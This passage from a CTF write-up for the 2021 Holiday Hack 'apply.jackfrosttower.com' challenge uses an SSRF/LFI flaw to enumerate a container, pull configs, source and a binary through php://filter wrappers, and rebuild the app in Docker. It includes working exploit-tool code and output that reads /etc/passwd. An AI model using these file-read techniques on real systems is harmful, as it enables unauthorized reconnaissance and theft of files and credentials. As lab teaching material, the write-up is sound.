            <span class="n">local_ip</span> <span class="o">=</span> <span class="n">hex_to_dec</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
            <span class="n">local_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">local</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s1">&#39;</span>

            <span class="n">remote_ip</span> <span class="o">=</span> <span class="n">hex_to_dec</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
            <span class="n">remote_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">remote</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">remote_ip</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">remote_port</span><span class="si">}</span><span class="s1">&#39;</span>

            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">local</span><span class="si">:</span><span class="s1">&lt;24</span><span class="si">}{</span><span class="n">remote</span><span class="si">:</span><span class="s1">&lt;24</span><span class="si">}{</span><span class="n">tcp_states</span><span class="p">[</span><span class="n">line</span><span class="p">[</span><span class="mi">3</span><span class="p">]]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</code></pre></div>
<p>Running this confirms what we guessed from the process list: <code>nginx</code> is listening
on port <code>80</code>, something is listening on port <code>9000</code> (most likely PHP-FPM), and
a final process is listening on the AWS metadata IP address <code>169.254.169.254</code>, 
undoubtedly the <code>ec2-metadata</code> process.</p>
<div class="highlight"><pre><span></span><code><span class="go">ssrf&gt; netstat</span>
<span class="go">Local Address           Remote Address          State</span>
<span class="go">127.0.0.1:9000          0.0.0.0:0               TCP_LISTEN</span>
<span class="go">169.254.169.254:80      0.0.0.0:0               TCP_LISTEN</span>
<span class="go">172.17.0.2:80           0.0.0.0:0               TCP_LISTEN</span>
<span class="go">172.17.0.2:80           130.211.0.94:62065      TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           130.211.1.78:55574      TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.15.167:64577     TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.8.30:59921       TCP_TIME_WAIT</span>
<span class="go">127.0.0.1:9000          127.0.0.1:46666         TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           130.211.1.86:61100      TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.12.197:59722     TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.19.122:50468     TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.15.218:59766     TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.3.69:53260       TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           35.191.9.214:50848      TCP_TIME_WAIT</span>
<span class="go">172.17.0.2:80           130.211.1.89:57593      TCP_TIME_WAIT</span>
<span class="go">...</span>
</code></pre></div>
<h2 id="identifying-the-container-distribution">Identifying the Container Distribution<a class="headerlink" href="#identifying-the-container-distribution" title="Permanent link">#</a></h2>
<p>The next piece of the puzzle we need to decipher is what Linux distribution
is the container built on. Identifying this is critical to re-creating the environment
on our local system. By requesting a number of different files inder <code>/etc</code>, we
can determine the distribtion version used:</p>
<ul>
<li><code>/etc/issue</code>: may contain information used as banners on virtual terminals</li>
<li><code>/etc/debian_version</code>: used on Debian-based distributions such as Ubuntu</li>
<li><code>/etc/redhat-release</code>: used on RedHat derivative distributions</li>
<li><code>/etc/alpine-release</code>: used on Alpine Linux, a lightweight Linux distribution
designed for low overhead environments such as containers</li>
</ul>
<p>Other distributions such as Arch or Gentoo will have files used that can
be used to identify them, discovering those is an exercise for the reader</p>
<p>Fetching <code>/etc/issue</code> shows that the container is running <a href="https://www.alpinelinux.org/">Alpine Linux</a>, and <code>/etc/alpine-release</code> shows it's specific version is <code>3.10.9</code>.</p>
<div class="highlight"><pre><span></span><code><span class="go">ssrf&gt; /etc/issue</span>
<span class="go">Welcome to Alpine Linux 3.10</span>
<span class="go">Kernel \r on an \m (\l)</span>


<span class="go">ssrf&gt; /etc/alpine-release</span>
<span class="go">3.10.9</span>

<span class="go">ssrf&gt;</span>
</code></pre></div>
<p>We now have enough information to create a version of the environment.</p>
<h2 id="enumerating-alpine-packages">Enumerating Alpine Packages<a class="headerlink" href="#enumerating-alpine-packages" title="Permanent link">#</a></h2>
<p>Apline uses the <code>apk</code> command for managing packages installed in the OS. While we can't
run commands on the container to determine what packages are installed, <code>apk</code> does
keep track of explicitly installed packages in the file <code>/etc/apk/world</code>:</p>
<div class="highlight"><pre><span></span><code><span class="go">ssrf&gt; /etc/apk/world</span>
<span class="go">alpine-baselayout</span>
<span class="go">alpine-keys</span>
<span class="go">apk-tools</span>
<span class="go">busybox</span>
<span class="go">curl</span>
<span class="go">libc-utils</span>
<span class="go">nginx</span>
<span class="go">php7</span>
<span class="go">php7-fpm</span>
<span class="go">php7-openssl</span>
<span class="go">supervisor</span>

<span class="go">ssrf&gt;</span>
</code></pre></div>
<p>The package list matches what we determined from the process
list: <code>supervisor</code>, <code>nginx</code>, <code>php7</code> and <code>php7-fpm</code> are installed in the
container, along with supporting packages such as <code>busybox</code> and <code>curl</code>. There
doesn't appear to be any kind of remote access service such as <code>ssh</code> or <code>ftp</code> 
available, which also confirms the information from the listening TCP sockets.
Finally, the <code>ec2-metadata</code> binary isn't listed in the list of installed
packages, indicating it may be installed separately as part of the container build.</p>
<h2 id="service-configuration-files">Service Configuration Files<a class="headerlink" href="#service-configuration-files" title="Permanent link">#</a></h2>
<h3 id="supervisordconf-and-startup-scripts">supervisord.conf and Startup Scripts<a class="headerlink" href="#supervisordconf-and-startup-scripts" title="Permanent link">#</a></h3>
<p>The first configuration file we'll need to pull is for <code>supervisord</code>, from 
<code>/etc/supervisor/conf.d/supervisord.conf</code>:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py --file /etc/supervisor/conf.d/supervisord.conf &gt; supervisord.conf

<span class="gp">$ </span>cat supervisord.conf
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="k">[supervisord]</span>
<span class="na">nodaemon</span><span class="o">=</span><span class="s">true</span>
<span class="na">user</span><span class="o">=</span><span class="s">root</span>

<span class="k">[program:php-fpm]</span>
<span class="na">command</span><span class="o">=</span><span class="s">php-fpm7 -F</span>
<span class="na">stdout_logfile</span><span class="o">=</span><span class="s">/wwwlog/php.log</span>
<span class="na">stdout_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">stderr_logfile</span><span class="o">=</span><span class="s">/dev/stderr</span>
<span class="na">stderr_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">autorestart</span><span class="o">=</span><span class="s">false</span>
<span class="na">startretries</span><span class="o">=</span><span class="s">0</span>

<span class="k">[program:gonginx]</span>
<span class="na">command</span><span class="o">=</span><span class="s">/opt/gonginx.sh</span>
<span class="na">stdout_logfile</span><span class="o">=</span><span class="s">/wwwlog/access.log</span>
<span class="na">stdout_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">stderr_logfile</span><span class="o">=</span><span class="s">/wwwlog/error.log</span>
<span class="na">stderr_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">autorestart</span><span class="o">=</span><span class="s">false</span>
<span class="na">startretries</span><span class="o">=</span><span class="s">0</span>

<span class="k">[program:imds]</span>
<span class="na">command</span><span class="o">=</span><span class="s">/opt/imds/imds.sh</span>
<span class="na">stdout_logfile</span><span class="o">=</span><span class="s">/dev/stdout</span>
<span class="na">stdout_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">stderr_logfile</span><span class="o">=</span><span class="s">/dev/stderr</span>
<span class="na">stderr_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
<span class="na">autorestart</span><span class="o">=</span><span class="s">false</span>
<span class="na">startretries</span><span class="o">=</span><span class="s">0</span>
</code></pre></div>
<p><code>supervisord</code> is managing 3 processes: <code>php-fpm7</code>, <code>/opt/gonginx.sh</code>, and
<code>/opt/imds/imds.sh</code>. Additionally, we see that the logs for PHP and <code>nginx</code> 
are stored in the directory <code>/wwwlog</code>. Pulling those logs might give us additional
information about how the server is configured.</p>
<p>The <code>gonginx.sh</code> script first determines the IP address assigned to the <code>eth0</code>
interface. It then
modifies <code>/etc/nginx/nginx.conf</code> in place, replacing the string <code>##ETH0IP##</code> with
the IP address. If we want to use this script unchanged, we'll
need to modify <code>nginx.conf</code> to have this configuration before we build the container.
It finally starts the <code>nginx</code> service in the foreground.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
<span class="c1"># Dynamically update the IP address to bind to in nginx.conf using eth0&#39;s current IP</span>
<span class="nb">echo</span> <span class="s2">&quot;Nginx startup script&quot;</span>
ip addr show dev eth0 <span class="p">|</span> grep <span class="s2">&quot;inet &quot;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\/.*//&#39;</span>
<span class="nv">ETH0IP</span><span class="o">=</span><span class="sb">`</span>ip addr show dev eth0 <span class="p">|</span> grep <span class="s2">&quot;inet &quot;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\/.*//&#39;</span><span class="sb">`</span>
<span class="nb">echo</span> <span class="nv">$ETH0IP</span>
sed -i <span class="s2">&quot;s/##ETH0IP##/</span><span class="nv">$ETH0IP</span><span class="s2">/&quot;</span> /etc/nginx/nginx.conf
grep listen /etc/nginx/nginx.conf
nginx -g <span class="s1">&#39;daemon off;&#39;</span>
</code></pre></div>
<p><code>imds.sh</code> starts the <code>ec2-metadata</code> service, after adding the <code>169.254.169.254</code> IP
address to the <code>lo</code> localhost interface.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
<span class="c1"># Configure networking</span>
ip addr add <span class="m">169</span>.254.169.254/32 dev lo

<span class="c1"># Start EC2 metadata-mock instance</span>
/opt/imds/ec2-metadata -c /opt/imds/config.json
</code></pre></div>
<h3 id="nginxconf">nginx.conf<a class="headerlink" href="#nginxconf" title="Permanent link">#</a></h3>
<p>Fetching <code>/etc/nginx/nginx.conf</code> shows that the server is configured to look for
index files as <code>index.php</code> and <code>index.html</code>, and that all files ending in <code>.php</code> and
<code>.html</code> are instead sent to the FastCGI server listening on <code>127.0.0.1:9000</code>:</p>
<div class="highlight"><pre><span></span><code>server {
    #listen [::]:80 default_server;
    listen 172.17.0.2:80 default_server;
    server_name _;

    sendfile off;

    root /var/www/html;
    index index.php index.html;
</code></pre></div>
<div class="highlight"><pre><span></span><code>    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ \.(php|html)$ {
        try_files $uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass  127.0.0.1:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param SCRIPT_NAME $fastcgi_script_name;
        fastcgi_index index.php;
        include fastcgi_params;
    }
</code></pre></div>
<h3 id="php-configuration">PHP Configuration<a class="headerlink" href="#php-configuration" title="Permanent link">#</a></h3>
<p>To configure PHP to match the actual container, we need to transfer some
additional files:</p>
<ul>
<li><code>/etc/php7/php.ini</code></li>
<li><code>/etc/php7/php-fpm.ini</code></li>
<li><code>/etc/php7/php-fpm.d/www.conf</code></li>
</ul>
<p>The last file defines the FastCGI pool used to execute the PHP code in the
application files. There is a non-standard configuration setting defined:</p>
<div class="highlight"><pre><span></span><code><span class="c1">; Limits the extensions of the main script FPM will allow to parse. This can</span>
<span class="c1">; prevent configuration mistakes on the web server side. You should only limit</span>
<span class="c1">; FPM to .php extensions to prevent malicious users to use other extensions to</span>
<span class="c1">; execute php code.</span>
<span class="c1">; Note: set an empty value to allow all extensions.</span>
<span class="c1">; Default Value: .php</span>
<span class="na">security.limit_extensions</span> <span class="o">=</span> <span class="s">.php .html</span>
</code></pre></div>
<p>This changes what file extensions are allowed to execute PHP code, adding <code>.html</code> 
as a valid PHP file.</p>
<h3 id="ec2-metadata-service-configuration">EC2 Metadata Service Configuration<a class="headerlink" href="#ec2-metadata-service-configuration" title="Permanent link">#</a></h3>
<p>The final configuration file we need to fetch configures the <code>ec2-metadata</code> 
program. It's a JSON file located at <code>/opt/imds/config.json</code> and contains the 
metadata values retrieved to complete the objective. The full JSON file contains
many other metadata values, to simulate a full EC2 configuration, in the event
a user queries for values other than the security-credentials. For example, 
the <code>apply.jackfrosttower.com</code> website is running in the <code>np-north-1a</code> availability
zone, which presumably stands for the <code>North Pole (North) 1a</code>.</p>
<div class="highlight"><pre><span></span><code><span class="nt">&quot;placement-availability-zone&quot;</span><span class="p">:</span> <span class="s2">&quot;np-north-1a&quot;</span><span class="p">,</span>
<span class="nt">&quot;placement-availability-zone-id&quot;</span><span class="p">:</span> <span class="s2">&quot;use1-az4&quot;</span><span class="p">,</span>
<span class="nt">&quot;placement-group-name&quot;</span><span class="p">:</span> <span class="s2">&quot;a-placement-group&quot;</span><span class="p">,</span>
<span class="nt">&quot;placement-host-id&quot;</span><span class="p">:</span> <span class="s2">&quot;h-0c01e8c7bbb9b49ea&quot;</span><span class="p">,</span>
<span class="nt">&quot;placement-partition-number&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
<span class="nt">&quot;placement-region&quot;</span><span class="p">:</span> <span class="s2">&quot;np-north-1&quot;</span><span class="p">,</span>
</code></pre></div>
<h2 id="application-files">Application Files<a class="headerlink" href="#application-files" title="Permanent link">#</a></h2>
<p>The last pieces needed to complete the application is the <code>ec2-metadata</code> executable
and the web application file(s). </p>
<h3 id="web-application-files">Web Application File(s)<a class="headerlink" href="#web-application-files" title="Permanent link">#</a></h3>
<p>With no way to list files, we have to guess at the file or files needed to run the
actual application. From the <code>nginx.conf</code> file, an educated guess is the main page
of the application is either <code>index.php</code> or <code>index.html</code>. Attempting to fetch
<code>index.html</code> succeeds in retrieving the application source:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py --file index.html &gt; index.html

<span class="gp">$ </span>cat index.html
<span class="go">&lt;?php</span>
<span class="go">define(&#39;DB_NAME&#39;, &#39;intern&#39;);</span>
<span class="go">define(&#39;DB_USER&#39;, &#39;intern&#39;);</span>
<span class="go">define(&#39;DB_PASSWORD&#39;, &#39;polarwinds&#39;);</span>
<span class="go">?&gt;</span>

<span class="go">&lt;!DOCTYPE html&gt;</span>
<span class="go">&lt;html lang=&quot;en&quot;&gt;</span>

<span class="go">&lt;head&gt;</span>
<span class="go">  &lt;meta charset=&quot;utf-8&quot;&gt;</span>
<span class="go">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span>
<span class="go">  &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span>
<span class="go">  &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span>

<span class="go">  &lt;title&gt;Frost Tower&lt;/title&gt;</span>
<span class="go">  &lt;link href=&quot;css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span>
<span class="go">...</span>
</code></pre></div>
<p>We'll dig deeper into how the application works later, once we have a version of
it running locally. We do need some additional files from the original
application. They're not absolutely necessary to test the code, but they make
the application look like the one hosted on <code>apply.jackfrosttower.com</code>:</p>
<ul>
<li><code>https://apply.jackfrosttower.com/css/bootstrap.min.css</code></li>
<li><code>https://apply.jackfrosttower.com/images/jack.png</code></li>
<li><code>https://apply.jackfrosttower.com/images/lab.png</code></li>
<li><code>https://apply.jackfrosttower.com/images/server.png</code></li>
<li><code>https://apply.jackfrosttower.com/images/zoomed2.png</code></li>
</ul>
<h3 id="ec2-metadata-binary"><code>ec2-metadata</code> Binary<a class="headerlink" href="#ec2-metadata-binary" title="Permanent link">#</a></h3>
<p>If we try and fetch the <code>/opt/imds/ec2-metadata</code> binary directly, the file returned
generates errors when run:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py --file /opt/imds/ec2-metadata &gt; ec2-metadata

<span class="gp">$ </span>file ec2-metadata
<span class="go">ec2-metadata: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), no program header, missing section headers at 125467397854331328</span>

<span class="gp">$ </span>chmod <span class="m">755</span> ec2-metadata

<span class="gp">$ </span>./ec2-metadata
<span class="go">bash: ./ec2-metadata: cannot execute binary file: Exec format error</span>
</code></pre></div>
<p>However, we can utilize <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers">PHP
filters</a>
in the SSRF/LFI vulnerability to compress and base64 encode the file before
we retrieve it, then write a function to reverse the process, saving the resulting
data stream to a file:</p>
<div class="highlight"><pre><span></span><code>    <span class="k">def</span> <span class="nf">do_largefile</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="sd">&#39;&#39;&#39;Fetch a large file, using PHP filters to compress and base64 encode&#39;&#39;&#39;</span>
        <span class="k">if</span> <span class="n">args</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
            <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
            <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;php://filter/zlib.deflate/convert.base64-encode/resource=</span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="s1">&#39;</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>

                <span class="c1"># zlib.decompress with a negative window size will ignore header</span>
                <span class="c1"># and footer values. Magic.</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="o">-</span><span class="mi">15</span><span class="p">)</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
                    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Wrote </span><span class="si">{}</span><span class="s1"> bytes to </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">filename</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;No data returned.&#39;</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">()</span>
</code></pre></div>
<p>The PHP filter sends the file specified via the <code>resource=</code> through two filters:</p>
<ul>
<li>first, the file is compressed via the 'deflate` algorithm</li>
<li>then the compressed data is base64-encoded</li>
</ul>
<p>The Python function reverses the process: base64-decoding the data returned from 
the <code>fetch()</code> function, then decompressing it via the <code>zlib</code> module. One quirk with
decompressing <code>deflate</code> data with <code>zlib</code>: the library expects the data to contain
a header and footer in the data, which PHP's <code>zlib</code> doesn't include. However, 
specifying a negative windows size to the <code>decompress()</code> function causes the
library to not look for the header and footer. Using this <code>largefile</code> function,
we can successfully fetch the <code>ec2-metadata</code> binary:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py
<span class="go">ssrf&gt; largefile /opt/imds/ec2-metadata</span>
<span class="go">Wrote 12275029 bytes to ec2-metadata</span>

<span class="go">ssrf&gt;</span>

<span class="gp">$ </span>file ec2-metadata
<span class="go">ec2-metadata: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=RgLJMo3PW55KpjxPNtR7/_3DcfCs7l1TpUSsi38cV/5P4Qwf-UXWsvAff99Cdp/zEip8jJiM6yQwB1h8mG5, not stripped</span>

<span class="gp">$ </span>chmod <span class="m">755</span> ec2-metadata

<span class="gp">$ </span>./ec2-metadata
<span class="go">2022/01/07 15:21:05 Warning:  Config File &quot;aemm-config&quot; Not Found in &quot;[/home/jra]&quot;</span>
<span class="go">2022/01/07 15:21:05 Initiating ec2-metadata-mock for all mocks on port 1338</span>
</code></pre></div>
<h2 id="building-the-container">Building the Container<a class="headerlink" href="#building-the-container" title="Permanent link">#</a></h2>
<p>We now have all the pieces we need to build the container and run the application
on our own infrastructure. We set up the <code>html/</code> and <code>opt/</code> directories with
the necessary files, along with the other various configuration files.</p>
<div class="highlight"><pre><span></span><code><span class="gp">root@docker:~/apply.jackfrosttower# </span>ls -R
<span class="go">.:</span>
<span class="go">Dockerfile  html        opt           php.ini  supervisord.conf</span>
<span class="go">README.md   nginx.conf  php-fpm.conf  run.sh   www.conf</span>

<span class="go">./html:</span>
<span class="go">css  images  index.html</span>

<span class="go">./html/css:</span>
<span class="go">bootstrap.min.css</span>

<span class="go">./html/images:</span>
<span class="go">jack.png  lab.png  server.png  zoomed2.png</span>

<span class="go">./opt:</span>
<span class="go">gonginx.sh  imds</span>

<span class="go">./opt/imds:</span>
<span class="go">config.json  ec2-metadata  imds.sh</span>
</code></pre></div>
<p>The <code>Dockerfile</code> puts it all together:</p>
<div class="highlight"><pre><span></span><code><span class="c">#</span>
<span class="c"># Dockerfile to reverse engineer https://apply.jackfrosttower.com</span>
<span class="c">#</span>
<span class="c"># Joe Ammond (pugpug)</span>
<span class="c">#</span>

<span class="k">FROM</span> <span class="s">alpine:3.10.9</span>

<span class="c"># Install packages</span>
<span class="k">RUN</span> apk update <span class="o">&amp;&amp;</span> apk add alpine-baselayout alpine-keys apk-tools <span class="se">\</span>
    busybox curl libc-utils nginx php7 php7-fpm php7-openssl <span class="se">\</span>
    supervisor bash

<span class="c"># Create directories</span>
<span class="k">RUN</span> mkdir -p /wwwlog /etc/supervisor/conf.d

<span class="c"># Copy application pieces</span>
<span class="k">COPY</span> opt /opt
<span class="k">COPY</span> html /var/www/html
<span class="k">COPY</span> nginx.conf /etc/nginx
<span class="k">COPY</span> php.ini /etc/php7
<span class="k">COPY</span> php-fpm.conf /etc/php7
<span class="k">COPY</span> www.conf /etc/php7/php-fpm.d
<span class="k">COPY</span> supervisord.conf /etc/supervisor/conf.d

<span class="c"># Fix some directory permissions</span>
<span class="k">RUN</span> chmod <span class="m">777</span> /var/www/html /var/www/html/images

<span class="c"># Expose port 80</span>
<span class="k">EXPOSE</span><span class="s"> 80</span>

<span class="c"># Run supervisord to manage the application pieces</span>
<span class="k">CMD</span> <span class="p">[</span><span class="s2">&quot;supervisord&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc/supervisor/conf.d/supervisord.conf&quot;</span><span class="p">]</span>
</code></pre></div>
<p>The container's base is Apline Linux, version 3.10.9, identical to the actual 
system. We add the packages from the <code>/etc/apk/world</code> file, then create any
necessary directories. After copying files the required files into place, we
set <code>supervisord</code> as the application for Docker to run, passing in the appropriate
configuration file.</p>
<p>We can build and run the container with a quick script:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>

docker build -t apply .
docker run -it --cap-add<span class="o">=</span>NET_ADMIN -p <span class="m">8888</span>:80 --rm apply:latest
</code></pre></div>
<p>We need to add the argument <code>--cap-add=NET_ADMIN</code> to allow the <code>imds.sh</code> script
to add the <code>169.254.169.254</code> IP address to the localhost interface. Once the container
is built and running, we can visit port <code>8888</code> to see the application running on our
local system:</p>
<p><img alt="Frost Tower, reverse engineered" src="../img/hhc-2021-19.png" /></p>
<p>And, we can verify the application's SSRF/LFI vulnerability still works in our
local version:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 apply-ssrf.py --url http://10.114.180.112:8888/
<span class="go">ssrf&gt; ps</span>
<span class="go">UID       PID PPID CMD</span>
<span class="go">root        1    0 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf</span>
<span class="go">root        8    1 /bin/sh /opt/gonginx.sh</span>
<span class="go">root        9    1 php-fpm: master process (/etc/php7/php-fpm.conf)</span>
<span class="go">root       10    1 /bin/sh /opt/imds/imds.sh</span>
<span class="go">root       22   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       24   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       25   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       26   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       27   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       28    8 nginx: master process nginx -g daemon off;</span>
<span class="go">root       29   10 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">nginx      30   28 nginx: worker process</span>
<span class="go">nobody     31    9 php-fpm: pool www</span>
<span class="go">nobody     32    9 php-fpm: pool www</span>

<span class="go">ssrf&gt; /etc/passwd</span>
<span class="go">root:x:0:0:root:/root:/bin/ash</span>
<span class="go">bin:x:1:1:bin:/bin:/sbin/nologin</span>
<span class="go">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span>
<span class="go">adm:x:3:4:adm:/var/adm:/sbin/nologin</span>
<span class="go">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
<span class="go">sync:x:5:0:sync:/sbin:/bin/sync</span>
<span class="go">...</span>

<span class="go">ssrf&gt;</span>
</code></pre></div>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../solution/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Solution" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Solution
            </div>
          </div>
        </a>
      
      
        
        <a href="../rce/" class="md-footer__link md-footer__link--next" aria-label="Next: LFI to RCE... maybe?" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              LFI to RCE... maybe?
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Joe Ammond - <a href="https://twitter.com/joeammond">@joeammond</a>
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
    </a>
  
    
    
      
      
    
